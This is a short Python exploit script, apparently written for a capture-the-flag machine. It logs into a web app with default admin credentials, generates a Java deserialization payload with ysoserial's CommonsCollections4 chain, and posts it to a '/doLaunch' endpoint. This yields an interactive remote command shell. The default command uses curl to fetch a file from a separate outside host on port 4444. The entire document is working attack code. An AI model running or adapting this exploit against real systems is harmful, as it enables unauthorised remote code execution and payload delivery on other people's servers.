import requests
import subprocess
import base64

url = 'http://46.101.23.157:32636/'

shellcmd = 'curl 52.55.153.92:4444/file'

def executepayload(shellcmd):
    s = requests.session()
    r = s.get(url)

    #POST /doSignIn HTTP/1.1
    #username=admin&password=admin
    creds = {'username': 'admin', 'password': 'admin'}
    r = s.post(url + 'doSignIn', data=creds)

    output = subprocess.check_output(['java', '-jar', '/home/coyote/htb/feline/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar', 'CommonsCollections4', shellcmd])
    b64 = base64.encodebytes(output).decode('latin-1').replace('\n', '')

    #POST /doLaunch HTTP/1.1
    #country=asdf&worm=rO0AB...
    payload = {'country': 'asdf', 'worm': b64}
    r = s.post(url + 'doLaunch', data=payload)

while True:
    shellcmd = input('> ')
    executepayload(shellcmd)